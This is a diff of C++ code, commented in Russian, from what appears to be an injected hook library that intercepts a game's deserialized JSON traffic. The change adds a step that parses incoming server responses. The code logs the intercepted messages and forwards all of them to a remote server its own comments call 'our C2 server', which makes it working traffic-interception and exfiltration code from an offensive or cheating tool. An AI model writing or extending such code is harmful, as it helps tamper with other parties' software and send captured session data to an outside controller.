@@ -83,23 +83,24 @@ void* (*orig_DeserializeObject)(void* str, void* type, void* settings);
 
 // --- Обработка JSON (общая логика) ---
 void ProcessJson(const std::string& rawJson, const char* tagPrefix) {
-    // 1. Проверяем на спам и лимиты (40 < len < 200000)
-    if (Utils::IsSpamOrIgnored(rawJson)) {
-        return; // Игнорируем
-    }
+    // 1. Проверки на спам (как было)
+    if (Utils::IsSpamOrIgnored(rawJson)) return;
 
-    // 2. Минифицируем
+    // 2. Минификация (как было)
     std::string minifiedJson = Utils::SmartMinify(rawJson);
-    
-    // Повторная проверка длины после минификации (на всякий случай)
-    if (Utils::IsSpamOrIgnored(minifiedJson)) {
-        return;
-    }
+    if (Utils::IsSpamOrIgnored(minifiedJson)) return;
 
-    // 3. Выводим в Logcat (чистый минифицированный JSON)
+    // 3. Логирование (как было)
     LogTraffic(tagPrefix, minifiedJson);
 
-    // 4. Отправляем на сервер (только если подключены)
+    // === НОВОЕ: ВАЛИДАЦИЯ КОМАНД ===
+    // Если это ВХОДЯЩИЙ трафик (ответ сервера игры), отдаем его менеджеру
+    if (strcmp(tagPrefix, "IN") == 0) {
+        CommandManager::Instance().AnalyzeGameResponse(minifiedJson);
+    }
+    // ===============================
+
+    // 4. Отправка на наш C2 сервер (оставляем для мониторинга)
     if (NetworkClient::Instance().IsConnected()) {
         std::string netMsg = std::string(tagPrefix) + ": " + minifiedJson;
         NetworkClient::Instance().SendRaw(netMsg);
